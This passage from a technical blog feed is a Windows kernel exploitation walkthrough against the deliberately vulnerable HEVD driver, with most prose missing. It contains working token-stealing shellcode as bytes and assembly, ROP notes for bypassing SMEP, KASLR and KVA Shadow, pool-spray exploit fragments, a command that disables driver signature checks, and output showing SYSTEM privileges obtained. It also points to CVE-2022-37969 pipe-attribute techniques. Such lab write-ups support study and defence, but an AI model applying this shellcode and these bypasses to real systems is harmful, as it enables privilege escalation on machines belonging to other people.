class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*ffffa78bef702a30 size:  5b0 previous size:    0  (Free)      *...~</span><br></pre></td></tr></table></figure><p><a href="https://vulndev.io/2022/07/14/windows-kernel-exploitation-hevd-x64-use-after-free/">(6)</a> <code>0xac, 0xb0</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; !poolused 2 NpFr</span><br><span class="line">Using a machine size of 1ffe7e pages to configure the kd cache</span><br><span class="line">...</span><br><span class="line"> Sorting by NonPaged Pool Consumed</span><br><span class="line">               NonPaged                  Paged</span><br><span class="line"> Tag     Allocs         Used     Allocs         Used</span><br><span class="line"></span><br><span class="line"> NpFr         1          112          0            0DATA_ENTRY records (read/write buffers) , Binary: npfs.sys</span><br><span class="line"></span><br><span class="line">TOTAL         1          112          0            0</span><br></pre></td></tr></table></figure><p>UAFFAKE_OBJECT</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x22201F</span>:</span><br><span class="line"><span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;****** HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL ******\n&quot;</span>);</span><br><span class="line">FakeObjectNonPagedPoolNxIoctlHandler = <span class="built_in">AllocateFakeObjectNonPagedPoolIoctlHandler</span>(Irp, CurrentStackLocation);</span><br><span class="line">v7 = <span class="string">&quot;****** HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL ******\n&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> LABEL_64;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">AllocateFakeObjectNonPagedPoolIoctlHandler</span><span class="params">(_IRP *Irp, _IO_STACK_LOCATION *IrpSp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _NAMED_PIPE_CREATE_PARAMETERS *Parameters; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  Parameters = IrpSp-&gt;Parameters.CreatePipe.Parameters;</span><br><span class="line">  result = <span class="number">0xC0000001</span>;</span><br><span class="line">  <span class="keyword">if</span> ( Parameters )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">AllocateFakeObjectNonPagedPool</span>((_FAKE_OBJECT_NON_PAGED_POOL *)Parameters);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">AllocateFakeObjectNonPagedPool</span><span class="params">(_FAKE_OBJECT_NON_PAGED_POOL *UserFakeObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _OWORD *PoolWithTag; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Creating Fake Object\n&quot;</span>);</span><br><span class="line">  PoolWithTag = <span class="built_in">ExAllocatePoolWithTag</span>(NonPagedPool, <span class="number">0x5C</span>ui64, <span class="number">0x6B636148</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( PoolWithTag )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Tag: %s\n&quot;</span>, <span class="string">&quot;&#x27;kcaH&#x27;&quot;</span>);</span><br><span class="line">    <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Type: %s\n&quot;</span>, <span class="string">&quot;NonPagedPool&quot;</span>);</span><br><span class="line">    <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Size: 0x%zX\n&quot;</span>, <span class="number">0x5C</span>ui64);</span><br><span class="line">    <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Chunk: 0x%p\n&quot;</span>, PoolWithTag);</span><br><span class="line">    <span class="built_in">ProbeForRead</span>(UserFakeObject, <span class="number">0x5C</span>ui64, <span class="number">1u</span>);</span><br><span class="line">    *PoolWithTag = *(_OWORD *)UserFakeObject-&gt;Buffer;</span><br><span class="line">    PoolWithTag[<span class="number">1</span>] = *(_OWORD *)&amp;UserFakeObject-&gt;Buffer[<span class="number">16</span>];</span><br><span class="line">    PoolWithTag[<span class="number">2</span>] = *(_OWORD *)&amp;UserFakeObject-&gt;Buffer[<span class="number">32</span>];</span><br><span class="line">    PoolWithTag[<span class="number">3</span>] = *(_OWORD *)&amp;UserFakeObject-&gt;Buffer[<span class="number">48</span>];</span><br><span class="line">    PoolWithTag[<span class="number">4</span>] = *(_OWORD *)&amp;UserFakeObject-&gt;Buffer[<span class="number">64</span>];</span><br><span class="line">    *((_QWORD *)PoolWithTag + <span class="number">10</span>) = *(_QWORD *)&amp;UserFakeObject-&gt;Buffer[<span class="number">80</span>];</span><br><span class="line">    *((_DWORD *)PoolWithTag + <span class="number">22</span>) = *(_DWORD *)&amp;UserFakeObject-&gt;Buffer[<span class="number">88</span>];</span><br><span class="line">    *((_BYTE *)PoolWithTag + <span class="number">91</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Fake Object: 0x%p\n&quot;</span>, PoolWithTag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[-] Unable to allocate Pool chunk\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3221225495</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">3: kd&gt; dq 0xFFFFA78BF933D540</span><br><span class="line">ffffa78b`f933d540  00000000`deadbeef 00000000`00000000</span><br><span class="line">ffffa78b`f933d550  00000000`00000000 00000000`00000000</span><br><span class="line">ffffa78b`f933d560  00000000`00000000 00000000`00000000</span><br><span class="line">ffffa78b`f933d570  00000000`00000000 00000000`00000000</span><br><span class="line">ffffa78b`f933d580  00000000`00000000 00000000`00000000</span><br><span class="line">ffffa78b`f933d590  00000000`00000000 00000000`00000000</span><br><span class="line">ffffa78b`f933d5a0  6b636148`02070000 00000000`00000000</span><br><span class="line">ffffa78b`f933d5b0  00000000`deadbeef 00000000`00000000</span><br></pre></td></tr></table></figure><h4 id="shellcode-1"><a href="#shellcode-1" class="headerlink" title="shellcode"></a>shellcode</h4><p>keystone</p><p><a href="https://github.com/vportal/HEVD/blob/main/HEVD_UAF_WIN10_21H2.cpp">HEVD&#x2F;HEVD_UAF_WIN10_21H2.cpp</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x04</span>, <span class="number">0x25</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xC3</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x9B</span>, <span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x81</span>, <span class="number">0xEB</span>, <span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x8B</span>, <span class="number">0x40</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xF9</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xE5</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x8B</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x80</span>, <span class="number">0xE1</span>, <span class="number">0xF0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x88</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0xC3</span> &#125;</span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="number">0</span>: <span class="number">65</span> <span class="number">48</span> <span class="number">8b</span> <span class="number">04</span> <span class="number">25</span> <span class="number">88</span> <span class="number">01</span>  mov  rax,QWORD PTR gs:<span class="number">0x188</span>  </span><br><span class="line"><span class="number">7</span>: <span class="number">00</span> <span class="number">00</span>  </span><br><span class="line"><span class="number">9</span>: <span class="number">48</span> <span class="number">8b</span> <span class="number">80</span> b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  mov  rax,QWORD PTR [rax+<span class="number">0xb8</span>]  </span><br><span class="line"><span class="number">10</span>: <span class="number">48</span> <span class="number">89</span> c3        mov  rbx,rax  </span><br><span class="line"><span class="number">13</span>: <span class="number">48</span> <span class="number">8b</span> <span class="number">9b</span> <span class="number">48</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>  mov  rbx,QWORD PTR [rbx+<span class="number">0x448</span>]  </span><br><span class="line"><span class="number">1</span>a: <span class="number">48</span> <span class="number">81</span> eb <span class="number">48</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>  sub  rbx,<span class="number">0x448</span>  </span><br><span class="line"><span class="number">21</span>: <span class="number">48</span> <span class="number">8b</span> <span class="number">8b</span> <span class="number">40</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>  mov  rcx,QWORD PTR [rbx+<span class="number">0x440</span>]  </span><br><span class="line"><span class="number">28</span>: <span class="number">48</span> <span class="number">83</span> f9 <span class="number">04</span>       cmp  rcx,<span class="number">0x4</span>  </span><br><span class="line"><span class="number">2</span>c: <span class="number">75</span> e5          jne  <span class="number">0x13</span>  </span><br><span class="line"><span class="number">2</span>e: <span class="number">48</span> <span class="number">8b</span> <span class="number">8b</span> b8 <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>  mov  rcx,QWORD PTR [rbx+<span class="number">0x4b8</span>]</span><br><span class="line"><span class="number">35</span>: <span class="number">80</span> e1 f0        <span class="keyword">and</span>  cl,<span class="number">0xf0</span>  </span><br><span class="line"><span class="number">38</span>: <span class="number">48</span> <span class="number">89</span> <span class="number">88</span> b8 <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>  mov  QWORD PTR [rax+<span class="number">0x4b8</span>],rcx  </span><br><span class="line"><span class="number">3f</span>: <span class="number">48</span> <span class="number">31</span> c0        <span class="keyword">xor</span>  rax,rax  </span><br><span class="line"><span class="number">42</span>: c3           ret</span><br></pre></td></tr></table></figure><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">3: kd&gt; dq 0xFFFFDC04FE779850</span><br><span class="line">ffffdc04`fe779850  00018825`048b4865 000000b8`808b4800</span><br><span class="line">ffffdc04`fe779860  04489b8b`48c38948 000448eb`81480000</span><br><span class="line">ffffdc04`fe779870  00000440`8b8b4800 8b48e575`04f98348</span><br><span class="line">ffffdc04`fe779880  f0e18000`0004b88b 48000004`b8888948</span><br><span class="line">ffffdc04`fe779890  00000000`00c3c031 00007ff7`85ad32d8</span><br><span class="line">ffffdc04`fe7798a0  00000000`00000000 00000000`00413f2e</span><br><span class="line">ffffdc04`fe7798b0  6b636148`02070000 61005400`00000000</span><br><span class="line">ffffdc04`fe7798c0  00018825`048b4865 000000b8`808b4800</span><br></pre></td></tr></table></figure><p></p><h4 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h4><p>bypass KASLR:  <code>ntoskrnl.exe</code> <br>bypass SEMP&#x2F;SMAP: CR420210<br>bypass KVA Sahdow: KVA(KPTI)<a href="https://alvinovo.top/post/memory-page-table-isolation/#3-1-KVA-Shadow">KVA Shadow</a> <code>NX</code></p><ul><li>AllocPoolWithTag </li><li><code>swapgs</code></li></ul><p>CR4201SMEP21smap <a href="https://www.cnblogs.com/HcyRcer/p/16559321.html">Cr0-Cr4</a>smepsmapSMEP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">2: kd&gt; r cr4</span><br><span class="line">cr4=0000000000350ef8</span><br><span class="line">2: kd&gt; .formats cr4</span><br><span class="line">Evaluate expression:</span><br><span class="line">  Hex:     00000000`00350ef8</span><br><span class="line">  Decimal: 3477240</span><br><span class="line">  Decimal (unsigned) : 3477240</span><br><span class="line">  Octal:   0000000000000015207370</span><br><span class="line">  Binary:  00000000 00000000 00000000 00000000 00000000 00110101 00001110 11111000</span><br><span class="line">  Chars:   .....5..</span><br><span class="line">  Time:    Tue Feb 10 13:54:00 1970</span><br><span class="line">  Float:   low 4.87265e-039 high 0</span><br><span class="line">  Double:  1.71798e-317</span><br></pre></td></tr></table></figure><p>ROPropper&#x2F;ROPgadget <code>ntoskrnl.exe</code> </p><ul><li><code>C:\Windows\WinSxS\amd64_microsoft-windows-os-kernelxxx\ntoskrnl.exe</code></li></ul><p>gadget</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(ntoskrnl.exe/PE/x86_64)&gt; imagebase <span class="number">0</span>x0</span><br><span class="line">[INFO] Imagebase <span class="built_in">set</span> to <span class="number">0</span>x0</span><br><span class="line"></span><br><span class="line">(ntoskrnl.exe/PE/x86_64)&gt; search mov cr4, r</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><a href="https://vulndev.io/2022/07/02/windows-kernel-exploitation-hevd-x64-stackoverflow/">Windows Kernel Exploitation x64 Stack Overflow </a>shellcodebypass KVA Shadow</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[BITS <span class="number">64</span>]</span><br><span class="line">start:</span><br><span class="line">  mov rax, [gs:<span class="number">0x188</span>]       ; KPCRB.<span class="built_in">CurrentThread</span> (_KTHREAD)</span><br><span class="line">  mov rax, [rax + <span class="number">0xb8</span>]     ; APCState.<span class="built_in">Process</span> (current _EPROCESS)</span><br><span class="line">  mov r8, rax               ; Store current _EPROCESS ptr in RBX</span><br><span class="line"> </span><br><span class="line">loop:</span><br><span class="line">  mov r8, [r8 + <span class="number">0x448</span>]      ; ActiveProcessLinks</span><br><span class="line">  sub r8, <span class="number">0x448</span>             ; Go back to start of _EPROCESS</span><br><span class="line">  mov r9, [r8 + <span class="number">0x440</span>]      ; <span class="built_in">UniqueProcessId</span> (PID)</span><br><span class="line">  cmp r9, <span class="number">4</span>                 ; SYSTEM PID? </span><br><span class="line">  jnz loop                  ; Loop until PID == <span class="number">4</span></span><br><span class="line"> </span><br><span class="line">replace:</span><br><span class="line">  mov rcx, [r8 + <span class="number">0x4b8</span>]      ; Get SYSTEM token</span><br><span class="line">  <span class="keyword">and</span> cl, <span class="number">0xf0</span>               ; Clear low <span class="number">4</span> bits of _EX_FAST_REF structure</span><br><span class="line">  mov [rax + <span class="number">0x4b8</span>], rcx     ; Copy SYSTEM token to current process</span><br><span class="line"> </span><br><span class="line">cleanup:</span><br><span class="line">  mov rax, [gs:<span class="number">0x188</span>]       ; _KPCR.Prcb.CurrentThread</span><br><span class="line">  mov cx, [rax + <span class="number">0x1e4</span>]     ; KTHREAD.KernelApcDisable</span><br><span class="line">  inc cx</span><br><span class="line">  mov [rax + <span class="number">0x1e4</span>], cx</span><br><span class="line">  mov rdx, [rax + <span class="number">0x90</span>]     ; ETHREAD.TrapFrame</span><br><span class="line">  mov rcx, [rdx + <span class="number">0x168</span>]    ; ETHREAD.TrapFrame.Rip</span><br><span class="line">  mov r11, [rdx + <span class="number">0x178</span>]    ; ETHREAD.TrapFrame.EFlags</span><br><span class="line">  mov rsp, [rdx + <span class="number">0x180</span>]    ; ETHREAD.TrapFrame.Rsp</span><br><span class="line">  mov rbp, [rdx + <span class="number">0x158</span>]    ; ETHREAD.TrapFrame.Rbp</span><br><span class="line">  <span class="keyword">xor</span> eax, eax  ;</span><br><span class="line">  swapgs</span><br><span class="line">  o64 sysret </span><br></pre></td></tr></table></figure><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; ba e1 &lt;ObjectAddr&gt;</span><br></pre></td></tr></table></figure><p></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">debugger</span>&gt;<span class="title">C</span>:\<span class="title">Users</span>\<span class="title">debugger</span>\<span class="title">Desktop</span>\<span class="title">HEVDExploit.exe</span></span></span><br><span class="line"><span class="function">[*] <span class="title">Spray</span> <span class="title">use</span> <span class="title">write</span> <span class="title">pipe</span></span></span><br><span class="line"><span class="function">[*] <span class="title">Create</span> <span class="title">UAF</span> <span class="title">Object</span> <span class="title">then</span> <span class="title">free</span></span></span><br><span class="line"><span class="function">[*] <span class="title">Prepare</span> <span class="title">shellcode</span></span></span><br><span class="line"><span class="function">[*] <span class="title">Spray</span> <span class="title">to</span> <span class="title">get</span> <span class="title">the</span> <span class="title">UAF</span> <span class="title">object</span> <span class="title">then</span> <span class="title">write</span> <span class="title">shellcode</span></span></span><br><span class="line"><span class="function">[*] <span class="title">Trigger</span> <span class="title">UAF</span> <span class="title">callback</span></span></span><br><span class="line"><span class="function"><span class="title">Microsoft</span> <span class="title">Windows</span> [ 10.0.19045.3930]</span></span><br><span class="line"><span class="function">(<span class="title">c</span>) <span class="title">Microsoft</span> <span class="title">Corporation</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">debugger</span>&gt;<span class="title">whoami</span></span></span><br><span class="line"><span class="function"><span class="title">nt</span> <span class="title">authority</span>\<span class="title">system</span></span></span><br></pre></td></tr></table></figure><p>tip: kernelVirtualAlloc</p><p> NonPagedPool </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">LPVOID pShellcode = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="number">0x100</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">RtlCopyMemory</span>(pShellcode, StealToken, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">LPVOID pKernelStack = <span class="built_in">VirtualAlloc</span>((LPVOID)stackAddr, <span class="number">0x14000</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">VirtualLock</span>(pKernelStack, <span class="number">0x14000</span>)) &#123;</span><br><span class="line"><span class="built_in">Error</span>(<span class="string">&quot;VirtualLock&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="update"><a href="#update" class="headerlink" title="update"></a>update</h4><p>NonPagedPoolshellcode</p><p>NamedPipeNamedPipeNonPagedPoolNxpoolspray named pipe</p><h3 id="Exploit-NonPagedPoolNx"><a href="#Exploit-NonPagedPoolNx" class="headerlink" title="Exploit NonPagedPoolNx"></a>Exploit NonPagedPoolNx</h3><p></p><p>NonPagedPoolexp</p><p><a href="https://github.com/vportal/HEVD/blob/main/README.md">HEVD</a></p><ul><li>FakeObjNamedPipedouble free</li><li>NtFsControlFileNamedPipeunbuffered</li><li> Irp-&gt;SystemBuffer </li></ul><h2 id="Q-A"><a href="#Q-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><p>Windows </p><ul><li>-&gt;-&gt;-&gt;-&gt;-&gt;-&gt;F7</li></ul><p></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /<span class="built_in">set</span> nointegritychecks on</span><br></pre></td></tr></table></figure><p>HEVDpdb</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; !sym noisy</span><br><span class="line">noisy <span class="built_in">mode</span> - symbol prompts on</span><br><span class="line"></span><br><span class="line"># </span><br><span class="line"><span class="number">0</span>: kd&gt; x /D HEVD!*</span><br><span class="line"> A B C D E F G H I J K L M N O P Q R S T U V W X Y Z</span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">SYMSRV:  <span class="title">BYINDEX</span>: 0<span class="title">x8</span></span></span><br><span class="line"><span class="function">         <span class="title">c</span>:\<span class="title">symbols</span>*<span class="title">https</span>://<span class="title">msdl.microsoft.com</span>/<span class="title">download</span>/<span class="title">symbols</span></span></span><br><span class="line"><span class="function">         <span class="title">HEVD.pdb</span></span></span><br><span class="line"><span class="function">         1<span class="title">A8235FDCA7F46E08A07A47D79B5A8991</span></span></span><br><span class="line"><span class="function"><span class="title">SYMSRV</span>:  <span class="title">UNC</span>: <span class="title">c</span>:\<span class="title">symbols</span>\<span class="title">HEVD.pdb</span>\1<span class="title">A8235FDCA7F46E08A07A47D79B5A8991</span>\<span class="title">HEVD.pdb</span> - <span class="title">path</span> <span class="title">not</span> <span class="title">found</span></span></span><br><span class="line"><span class="function">...</span></span><br></pre></td></tr></table></figure><h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><p>CVEtoken<a href="https://bbs.kanxue.com/thread-277554.htm">CVE-2022-37969 </a>,pipe</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreatePipe</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          PHANDLE               hReadPipe,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          PHANDLE               hWritePipe,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPSECURITY_ATTRIBUTES lpPipeAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DWORD                 nSize</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p> <code>PipeAttribute</code>PipeAttribute<code>PagedPool</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">PipeAttribute</span> &#123;</span><br><span class="line">    LIST_ENTRY list ;</span><br><span class="line">    <span class="type">char</span> * AttributeName;</span><br><span class="line">    <span class="type">uint64_t</span> AttributeValueSize;</span><br><span class="line">    <span class="type">char</span> * AttributeValue;</span><br><span class="line">    <span class="type">char</span> data [<span class="number">0</span>];</span><br><span class="line"> &#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> &#123;</span><br><span class="line">   <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> *Flink;</span><br><span class="line">   <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> *Blink;</span><br><span class="line"> &#125; LIST_ENTRY, *PLIST_ENTRY, PRLIST_ENTRY;</span><br></pre></td></tr></table></figure><p>steal token </p><ul><li><code>NtQuerySystemInformation</code> APISYSTEMSystemPID 4_EPROCESS_TOKEN</li><li>OpenProcessToken</li><li>token</li></ul><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ul><li><a href="https://mdanilor.github.io/posts/">Posts (mdanilor.github.io)</a></li><li><a href="https://paper.seebug.org/1743/">Scoop the Windows 10 pool !</a></li><li><a href="https://bbs.kanxue.com/thread-276550.htm">win</a></li><li><a href="https://xz.aliyun.com/t/13434?time__1311=mqmxnDBQqQq2D/D0Dx2DUrzLtg0D7uP+D&alichlgref=https://xz.aliyun.com/">Windows</a></li><li><a href="https://www.alex-ionescu.com/?p=231">Sheep Year Kernel Heap Fengshui</a></li><li><a href="https://www.alex-ionescu.com/kernel-heap-spraying-like-its-2015-swimming-in-the-big-kids-pool/">Sheep Year Kernel Heap Fengshui: Spraying in the Big Kids Pool</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> HEVD </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HEVD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>msf</title>
      <link href="/2024/01/31/msf/"/>
      <url>/2024/01/31/msf/</url>
      
